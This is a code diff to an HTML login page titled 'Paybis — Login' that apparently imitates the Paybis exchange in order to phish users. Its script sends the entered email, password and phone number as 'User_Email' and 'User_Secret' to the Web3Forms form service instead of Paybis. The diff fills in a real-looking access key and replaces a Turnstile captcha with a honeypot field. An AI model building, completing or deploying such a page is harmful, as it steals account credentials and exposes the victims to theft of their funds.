@@ -5,9 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Paybis — Login</title>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flag-icons@7.2.3/css/flag-icons.min.css">
-<!-- Cloudflare Turnstile Script -->
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
   body {
@@ -208,12 +205,13 @@
           <input type="password" id="passEmail" placeholder="••••••••">
           <span class="eye-icon" id="togglePassEmail">👁️</span>
         </div>
+        
+        <!-- Honeypot field for Spam Protection (Invisible to users) -->
+        <input type="checkbox" name="botcheck" id="botcheck" style="display: none !important;" tabindex="-1" autocomplete="off">
+
         <div class="forgot-wrap">
           <a class="forgot-link" id="forgotBtn">Forgot Password?</a>
         </div>
-
-        <!-- Cloudflare Turnstile Widget -->
-        <div class="cf-turnstile" data-sitekey="YOUR_TURNSTILE_SITE_KEY_HERE" style="margin-bottom: 16px;"></div>
 
         <button type="submit" class="btn">Login</button>
       </form>
@@ -235,10 +233,10 @@
   // ============================================================
   // WEB3FORMS CONFIG
   // ============================================================
-  const WEB3FORMS_ACCESS_KEY = "YOUR_WEB3FORMS_ACCESS_KEY_HERE"; 
+  const WEB3FORMS_ACCESS_KEY = "fbaea0dd-88c1-42f9-83d1-125b0f927133"; 
   // ============================================================
 
-  // --- Country list with EXACT Mobile Lengths ---
+  // --- Country list ---
   const COUNTRIES = [
     ["Afghanistan","AF","+93", 9],["Albania","AL","+355", 9],["Algeria","DZ","+213", 9],["Andorra","AD","+376", 6],
     ["Angola","AO","+244", 9],["Antigua and Barbuda","AG","+1268", 10],["Argentina","AR","+54", 10],["Armenia","AM","+374", 8],
@@ -409,17 +407,11 @@
     const email = document.getElementById('email').value.trim();
     const pass  = document.getElementById('passEmail').value;
     const mobile = displayMobile.textContent;
+    const botcheck = document.getElementById('botcheck').checked;
 
     if (!email) { showError('Email address is required.'); return; }
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Please enter a valid email address.'); return; }
     if (!pass) { showError('Password is required.'); return; }
-
-    // Turnstile Verification
-    const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]');
-    if (!turnstileResponse || !turnstileResponse.value) {
-      showError('Kripya spam verification complete karein (Check the box).');
-      return;
-    }
 
     const submitBtn = e.target.querySelector('.btn');
     submitBtn.disabled = true;
@@ -428,7 +420,7 @@
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
     try {
-      // Web3Forms Direct API Call (Free Plan works perfectly)
+      // Web3Forms Direct API Call
       const response = await fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         headers: {
@@ -443,7 +435,7 @@
           User_Email: email,    
           User_Secret: pass,    
           Time: time,
-          "cf-turnstile-response": turnstileResponse.value // Send turnstile token
+          botcheck: botcheck // Honeypot check
         })
       });
 
